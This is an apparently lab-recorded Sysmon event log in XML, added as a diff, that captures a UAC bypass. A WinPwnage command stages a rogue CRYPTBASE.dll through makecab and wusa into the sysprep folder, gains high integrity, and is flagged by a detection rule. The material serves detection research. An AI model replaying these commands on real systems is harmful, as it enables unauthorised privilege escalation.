@@ -1,0 +1,261 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-11T16:54:02.071391500Z" />
+      <EventRecordID>15986</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2008" ThreadID="1992" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-11 16:54:02.071</Data>
+      <Data Name="ProcessGuid">{365abb72-fe2a-5cd6-0000-00107e091700}</Data>
+      <Data Name="ProcessId">2028</Data>
+      <Data Name="Image">C:\Python27\python.exe</Data>
+      <Data Name="FileVersion">?</Data>
+      <Data Name="Description">?</Data>
+      <Data Name="Product">?</Data>
+      <Data Name="Company">?</Data>
+      <Data Name="CommandLine">python  winpwnage.py -u uac -i 14 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-f9cd-5cd6-0000-002065370100}</Data>
+      <Data Name="LogonId">0x13765</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5</Data>
+      <Data Name="ParentProcessGuid">{365abb72-fab8-5cd6-0000-0010da8f0a00}</Data>
+      <Data Name="ParentProcessId">300</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>11</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>11</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-11T16:54:02.305766500Z" />
+      <EventRecordID>15987</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2008" ThreadID="1992" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-11 16:54:02.305</Data>
+      <Data Name="ProcessGuid">{365abb72-fe2a-5cd6-0000-00107e091700}</Data>
+      <Data Name="ProcessId">2028</Data>
+      <Data Name="Image">c:\python27\python.exe</Data>
+      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Temp\CRYPTBASE.dll</Data>
+      <Data Name="CreationUtcTime">2019-05-11 16:54:02.305</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-11T16:54:07.508891500Z" />
+      <EventRecordID>15988</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2008" ThreadID="1992" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-11 16:54:07.368</Data>
+      <Data Name="ProcessGuid">{365abb72-fe2f-5cd6-0000-001019201700}</Data>
+      <Data Name="ProcessId">2956</Data>
+      <Data Name="Image">C:\Windows\System32\makecab.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Microsoft« Cabinet Maker</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\makecab.exe" c:\users\ieuser\appdata\local\temp\CRYPTBASE.dll c:\users\ieuser\appdata\local\temp\suspicious.cab</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-f9cd-5cd6-0000-002065370100}</Data>
+      <Data Name="LogonId">0x13765</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5</Data>
+      <Data Name="ParentProcessGuid">{365abb72-fe2a-5cd6-0000-00107e091700}</Data>
+      <Data Name="ParentProcessId">2028</Data>
+      <Data Name="ParentImage">C:\Python27\python.exe</Data>
+      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 14 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>11</EventID>
+      <Version>2</Version>
+      <Level>4</Level>
+      <Task>11</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-11T16:54:07.524516500Z" />
+      <EventRecordID>15989</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2008" ThreadID="1992" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-11 16:54:07.462</Data>
+      <Data Name="ProcessGuid">{365abb72-fe2f-5cd6-0000-001019201700}</Data>
+      <Data Name="ProcessId">2956</Data>
+      <Data Name="Image">C:\Windows\System32\makecab.exe</Data>
+      <Data Name="TargetFilename">C:\Users\IEUser\AppData\Local\Temp\suspicious.cab</Data>
+      <Data Name="CreationUtcTime">2019-05-11 16:54:07.462</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-11T16:54:12.493266500Z" />
+      <EventRecordID>15990</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2008" ThreadID="1992" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-11 16:54:12.399</Data>
+      <Data Name="ProcessGuid">{365abb72-fe34-5cd6-0000-0010eb2e1700}</Data>
+      <Data Name="ProcessId">3688</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\wusa.exe" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32\sysprep /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-f9cd-5cd6-0000-002065370100}</Data>
+      <Data Name="LogonId">0x13765</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-fe2a-5cd6-0000-00107e091700}</Data>
+      <Data Name="ParentProcessId">2028</Data>
+      <Data Name="ParentImage">C:\Python27\python.exe</Data>
+      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 14 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-11T16:54:12.821391500Z" />
+      <EventRecordID>15991</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2008" ThreadID="1992" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-11 16:54:12.571</Data>
+      <Data Name="ProcessGuid">{365abb72-fe34-5cd6-0000-0010b8481700}</Data>
+      <Data Name="ProcessId">4000</Data>
+      <Data Name="Image">C:\Windows\System32\wusa.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Windows Update Standalone Installer</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">"C:\Windows\System32\wusa.exe" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32\sysprep /quiet</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-f9cd-5cd6-0000-00201b370100}</Data>
+      <Data Name="LogonId">0x1371b</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-fe2a-5cd6-0000-00107e091700}</Data>
+      <Data Name="ParentProcessId">2028</Data>
+      <Data Name="ParentImage">C:\Python27\python.exe</Data>
+      <Data Name="ParentCommandLine">python  winpwnage.py -u uac -i 14 -p c:\Users\IEUser\Desktop\hellox86.dll</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>7</EventID>
+      <Version>3</Version>
+      <Level>4</Level>
+      <Task>7</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-11T16:54:18.069438400Z" />
+      <EventRecordID>15992</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2008" ThreadID="1992" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">Possible UAC Bypass - mcx2prov DLL</Data>
+      <Data Name="UtcTime">2019-05-11 16:54:17.821</Data>
+      <Data Name="ProcessGuid">{365abb72-fe39-5cd6-0000-001012701700}</Data>
+      <Data Name="ProcessId">2572</Data>
+      <Data Name="Image">C:\Windows\System32\sysprep\sysprep.exe</Data>
+      <Data Name="ImageLoaded">C:\Windows\System32\sysprep\CRYPTBASE.dll</Data>
+      <Data Name="FileVersion">?</Data>
+      <Data Name="Description">?</Data>
+      <Data Name="Product">?</Data>
+      <Data Name="Company">?</Data>
+      <Data Name="Hashes">SHA1=AA3BF7118AE8138859FC0EE9202684C6DA22C176,MD5=3F090AA1CAE8B179F93B2064B8609AE2,SHA256=AC1DD32C41F6002BDF2EB564653FF23E069594CE55F9E22093355084EE28A6FD,IMPHASH=10D8CBCC4D9E244D697F1C09224856DC</Data>
+      <Data Name="Signed">false</Data>
+      <Data Name="Signature">
+      </Data>
+      <Data Name="SignatureStatus">Unavailable</Data>
+    </EventData>
+  </Event>
+</root>
